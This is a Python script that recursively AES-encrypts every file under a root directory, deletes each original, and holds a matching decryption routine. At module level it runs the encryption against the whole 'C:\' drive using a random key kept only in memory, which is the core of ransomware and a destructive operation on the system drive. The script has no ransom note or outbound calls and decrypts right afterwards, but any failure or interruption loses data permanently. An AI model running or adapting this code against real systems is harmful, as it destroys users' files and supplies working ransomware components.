import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def encrypt_files(root_directory, key):
    """
    Encrypts all files in the specified directory and subdirectories
    :param root_directory: Root directory to start encrypting files
    :param key: Encryption key
    """
    for dirpath, dirnames, filenames in os.walk(root_directory):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            # Read the file
            with open(file_path, "rb") as file:
                data = file.read()
            # Create a new AES cipher
            cipher = AES.new(key, AES.MODE_EAX)
            # Encrypt the data
            ciphertext, tag = cipher.encrypt_and_digest(data)
            # Write the encrypted data to a new file
            with open(file_path + ".enc", "wb") as file:
                [file.write(x) for x in (cipher.nonce, tag, ciphertext)]
            # Remove the original file
            os.remove(file_path)

def decrypt_files(root_directory, key):
    """
    Decrypts all files in the specified directory and subdirectories
    :param root_directory: Root directory to start decrypting files
    :param key: Decryption key
    """
    for dirpath, dirnames, filenames in os.walk(root_directory):
        for filename in filenames:
            if filename.endswith(".enc"):
                file_path = os.path.join(dirpath, filename)
                # Read the encrypted file
                with open(file_path, "rb") as file:
                    nonce, tag, ciphertext = [file.read(x) for x in (16, 16, -1)]
                # Create a new AES cipher
                cipher = AES.new(key, AES.MODE_EAX, nonce)
                # Decrypt the data
                data = cipher.decrypt_and_verify(ciphertext, tag)
                # Write the decrypted data to a new file
                with open(file_path[:-4], "wb") as file:
                    file.write(data)
                # Remove the original file
                os.remove(file_path)

key = get_random_bytes(16) # Encryption key
encrypt_files("C:\\", key) # Encrypt all files in all directories
decrypt_files("C:\\", key) # Decrypt all files in all directories
